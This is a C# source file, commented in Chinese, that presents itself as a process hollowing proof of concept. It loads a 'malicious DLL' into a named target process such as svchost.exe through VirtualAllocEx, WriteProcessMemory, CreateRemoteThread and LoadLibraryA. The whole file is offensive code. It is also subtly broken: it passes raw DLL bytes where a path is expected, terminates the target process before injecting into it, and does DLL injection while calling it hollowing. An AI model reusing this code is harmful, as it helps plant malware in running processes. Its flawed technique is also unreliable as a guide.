using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class ProcessHollowingPoC
{
    // API 函数声明
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 0x04;
    const uint CREATE_SUSPENDED = 0x00000004;

    static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Usage: ProcessHollowingPoC.exe <TargetProcessName> <MaliciousDLLPath>");
            Console.WriteLine("Example: ProcessHollowingPoC.exe svchost.exe C:\\malware.dll");
            return;
        }

        string targetProcessName = args[0];
        string maliciousDLLPath = args[1];

        // 1. 找到目标进程 ID
        Process[] processes = Process.GetProcessesByName(targetProcessName);
        if (processes.Length == 0)
        {
            Console.WriteLine($"Error: Process '{targetProcessName}' not found.");
            return;
        }

        // 2. 创建空壳进程（模拟攻击者行为）
        Console.WriteLine($"[+] Creating hollowed process: {targetProcessName}");
        var processInfo = new PROCESS_INFORMATION();
        var startupInfo = new STARTUPINFO();
        startupInfo.cb = (uint)Marshal.SizeOf(startupInfo);

        // 使用 CreateProcessWithTokenW 创建空壳进程（简化示例）
        // 注意：实际攻击中可能需要更复杂的权限获取
        Process.Start(targetProcessName).WaitForInputIdle(); // 等待进程就绪

        // 3. 终止进程主体（模拟空洞化）
        Console.WriteLine("[+] Terminating process body...");
        TerminateProcess(processes[0].Handle, 0);

        // 4. 注入恶意 DLL
        Console.WriteLine($"[+] Injecting malicious DLL: {maliciousDLLPath}");
        InjectMaliciousDLL(processes[0].Handle, maliciousDLLPath);

        Console.WriteLine("[+] Process Hollowing PoC completed.");
    }

    static void InjectMaliciousDLL(IntPtr hProcess, string dllPath)
    {
        // 读取 DLL 文件内容
        byte[] dllBytes = System.IO.File.ReadAllBytes(dllPath);
        IntPtr remoteMemory = IntPtr.Zero;

        try
        {
            // 1. 在目标进程中分配内存
            remoteMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (remoteMemory == IntPtr.Zero)
            {
                throw new Exception("VirtualAllocEx failed");
            }

            // 2. 写入 DLL 内容
            uint bytesWritten;
            if (!WriteProcessMemory(hProcess, remoteMemory, dllBytes, (uint)dllBytes.Length, out bytesWritten))
            {
                throw new Exception("WriteProcessMemory failed");
            }

            // 3. 加载 DLL
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (loadLibraryAddr == IntPtr.Zero)
            {
                throw new Exception("GetProcAddress failed");
            }

            // 4. 创建远程线程执行 LoadLibrary
            uint threadId;
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, remoteMemory, 0, out threadId);
            if (hThread == IntPtr.Zero)
            {
                throw new Exception("CreateRemoteThread failed");
            }

            // 等待线程完成
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        finally
        {
            // 释放内存（可选）
            if (remoteMemory != IntPtr.Zero)
            {
                VirtualFreeEx(hProcess, remoteMemory, 0, 0x8000);
            }
        }
    }

    // 辅助函数
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
